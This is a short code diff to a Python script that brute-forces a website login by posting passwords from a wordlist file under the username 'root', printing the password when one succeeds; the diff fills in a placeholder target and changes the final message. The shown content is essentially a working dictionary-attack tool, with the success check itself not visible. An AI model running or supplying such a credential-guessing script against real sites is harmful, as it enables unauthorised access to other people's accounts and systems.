@@ -2,7 +2,7 @@
 
 import requests
 
-target_url = ""
+target_url = "yourwebsite.com"
 data_dictionary = {"username": "root", "password": "", "Login": "submit"}
 
 with open("/directory*/path*/folder*/passwords.txt", "r") as passwords_file:
@@ -14,5 +14,5 @@ with open("/directory*/path*/folder*/passwords.txt", "r") as passwords_file:
             print("[+] Password found --> " + passwd)
             exit()
 
-print("[+] End of search! ")
+print("[+] Password not found! ")
 
